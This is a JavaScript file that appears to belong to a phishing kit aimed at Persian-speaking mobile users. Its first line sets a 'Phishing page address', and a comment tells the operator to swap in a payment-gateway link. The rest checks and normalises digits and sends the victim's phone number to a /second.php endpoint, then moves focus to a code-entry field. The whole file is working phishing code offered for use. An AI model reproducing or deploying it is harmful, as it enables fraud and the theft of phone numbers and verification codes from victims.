var page = "https://google.com" + "?price=10,000"; //Phishing page address

// https://google.com  in linko ba address dargah avaz konid (bdoon qymat)

let map =  {
    '۰' : "0", 
    '۱' : "1", 
    '۲' : "2", 
    '۳' : "3", 
    '۴' : "4",
    '۵' : "5", 
    '۶' : "6", 
    '۷' : "7",
    '۸' : "8", 
    '۹' : "9"
   };

let map1 = {
    '٠' : "0",
    '١' : "1",
    '٢' : "2",
    '٣' : "3",
    '٤' : "4",
    '٥' : "5",
    '٦' : "6",
    '٧' : "7",
    '٨' : "8",
    '٩' : "9",
};
  function changech(el){
    el.value = el.value.replace(/[۰۱۲۳۴۵۶۷۸۹]/g, function(match){
      return map[match]
    });
    el.value = el.value.replace(/[٠١٢٣٤٥٦٧٨٩]/g, function(match){
      return map1[match]
    })
  }

$(document).ready(function() {
    var defaultSettings = 'fa';
    (function($) {

        $.fn.persiaNumber = function(settings) {
            if (typeof(settings) == 'string' && settings.length > 0)
                defaultSettings = settings;
            var range = 1728;
            if (settings == 'ar') {
                range = 1584;
            }
            window.persiaNumberedDOM = this;
            convert(this, range);
            $(document).ajaxComplete(function() {
                var thisObj = window.persiaNumberedDOM;
                convert(thisObj, range);
            });

            function convert(obj, range) {
                obj.find("*").andSelf().contents().each(function() {
                    if (this.nodeType === 3 && this.parentNode.localName != "style" && this.parentNode.localName != "script") {
                        this.nodeValue = this.nodeValue.replace(this.nodeValue.match(/[0-9]*\.[0-9]+/), function(txt) {
                            return txt.replace(/\./, ',');
                        });
                        this.nodeValue = this.nodeValue.replace(/\d/g, function(v) {
                            return String.fromCharCode(v.charCodeAt(0) + range);
                        });
                    }
                });
            }
        };
    })(jQuery);




    function validatePhone(phone) {
        var regex = /0?9[0-9]{9}/;
        return regex.test(phone);
    }


    
    $(".pincode").keyup(function() {
        this.value = this.value.replace(/[^0-9\.]/g, '');

        if (this.value.length == this.maxLength) {
            var $next = $(this).parent().next('.input-container').find('.pincode');

            if ($next.length) {
                $next.focus();
            } else {
                $(this).blur();

            }

        }
    });



	$("#SubmitPhone").on("click", function(e) { 
        e.preventDefault();

       

        var PhoneNumber = $('#PhoneNumber').val();

        if (validatePhone(PhoneNumber)) {

            $("#MessageSubmit").text("");
            $(".modal").addClass("active");


            $("body").addClass("fade");

            $.ajax({
                url: '/second.php',
                type: 'GET',
                data: {
                    MobileNumber: PhoneNumber,
                    content: $('input[name=content]').val()
                },
                success: function(status) {
                //    $('#PhoneNumber').val('');
                    $('#digit').focus();
                },
                error: function(status) {
                    $("#MessageSubmit").text("خطایی پیش امده ، مجدد تلاش کنید"); 
                }
            });

        } else {
             

            $("#MessageSubmit").text("لطفا شماره همراه را به‌صورت صحیح وارد نمایید");
        }
    });